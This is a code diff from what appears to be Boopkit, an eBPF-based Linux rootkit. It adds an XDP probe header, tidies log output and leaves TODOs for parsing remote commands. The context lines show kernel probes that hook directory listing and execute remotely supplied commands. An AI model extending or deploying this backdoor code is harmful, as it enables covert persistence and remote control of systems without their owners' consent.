@@ -39,6 +39,7 @@
 #include "boopkit.h"
 #include "common.h"
 #include "pr0be.skel.safe.h"
+#include "pr0be.skel.xdp.h"
 // clang-format on
 
 void usage() {
@@ -259,7 +260,7 @@ int main(int argc, char **argv) {
       boopprintf("Permission denied.\n");
       return 1;
     }
-    boopprintf("  ->   eBPF Probe Loaded         : %s\n", cfg.pr0besafepath);
+    boopprintf("  ->   eBPF Probe Loaded     : %s\n", cfg.pr0besafepath);
     int index = PROG_01;
     int prog_fd = bpf_program__fd(sfobj->progs.handle_getdents_exit);
     int ret = bpf_map_update_elem(bpf_map__fd(sfobj->maps.map_prog_array),
@@ -309,14 +310,12 @@ int main(int argc, char **argv) {
       boopprintf("Unable to load eBPF object: %s\n", cfg.pr0bebooppath);
       return 1;
     }
-    boopprintf("  ->   eBPF Probe Loaded         : %s\n", cfg.pr0bebooppath);
+    boopprintf("  ->   eBPF Probe Loaded     : %s\n", cfg.pr0bebooppath);
     bpf_object__next_map(bpobj, NULL);
     bpf_object__for_each_program(program, bpobj) {
-      boopprintf("  ->   eBPF Program Address      : %p\n", program);
       const char *progname = bpf_program__name(program);
-      boopprintf("  ->   eBPF Program Name         : %s\n", progname);
       const char *progsecname = bpf_program__section_name(program);
-      boopprintf("  ->   eBPF Program Section Name : %s\n", progsecname);
+      boopprintf("  ->   eBPF Program Attached : %s %s\n", progname, progsecname);
       struct bpf_link *link = bpf_program__attach(program);
       if (!link) {
         boopprintf("Unable to link eBPF program: %s\n", progname);
@@ -401,6 +400,9 @@ int main(int argc, char **argv) {
           }
           free(rce);
         } else {
+
+          //__u8 saddrbytes[4];
+
           // TODO Parse RCE from map/encapsulation
           // TODO Read from XDP
           // boopprintf("  <- Executing: %s\r\n", ret.rce);
